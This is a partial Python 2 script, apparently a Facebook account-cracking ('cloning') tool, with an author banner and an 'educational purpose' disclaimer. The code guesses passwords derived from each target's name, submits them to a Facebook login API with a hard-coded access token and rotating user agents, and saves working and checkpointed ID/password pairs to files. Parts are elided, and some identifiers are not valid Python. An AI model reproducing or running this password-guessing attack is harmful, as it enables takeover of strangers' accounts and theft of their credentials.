#Script Given By Tech FOYSAL HOSEN
#Script Is Given For Educational Purpose
#Script Edited By @YourMr.FOYSAL
#Utf-8 python 
...
\033[1;92m d88888b  .d88b.  db    db .d8888.  .d8b.  db      
\033[1;92m 88'     .8P  Y8. `8b  d8' 88'  YP d8' `8b 88      
\033[1;92m 88ooo   88    88  `8bd8'  `8bo.   88ooo88 88      
\033[1;92m 88~~~   88    88    88      `Y8b. 88~~~88 88      
\033[1;92m 88      `8b  d8'    88    db   8D 88   88 88booo. 
\033[1;92m YP       `Y88P'     YP    `8888Y' YP   YP Y88888P 
                                                                                                                                                                                                  
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Mohammad Foysal
\033[1;92mFb \033[1;93m: FOYSAL HOSEN 
\033[1;92mWhatsapp \033[1;93m: 01793268786
\033[0m----------------------------------
...
def crack_select():
    ...
    if select == '1':
        ...
        try:
            ...
            print logo
            print ''
            print '  Cloning from: ' + q['Mr.FOYSAL']
        except KeyError:
    ...
    def main(arg):
        user = arg
        uid, Mr.FOYSAL = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = Mr.FOYSAL.lower()
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_Mr.FOYSAL=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Mr.FOYSAL-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[Mr.FOYSAL-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = Mr.FOYSAL.lower().split(' ')[0] + Mr.FOYSAL.lower().split(' ')[1]
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[Mr.FOYSAL-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = Mr.FOYSAL.lower() + 'khan'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_Mr.FOYSAL=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[Mr.FOYSAL-OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('okids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31m[Mr.FOYSAL-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
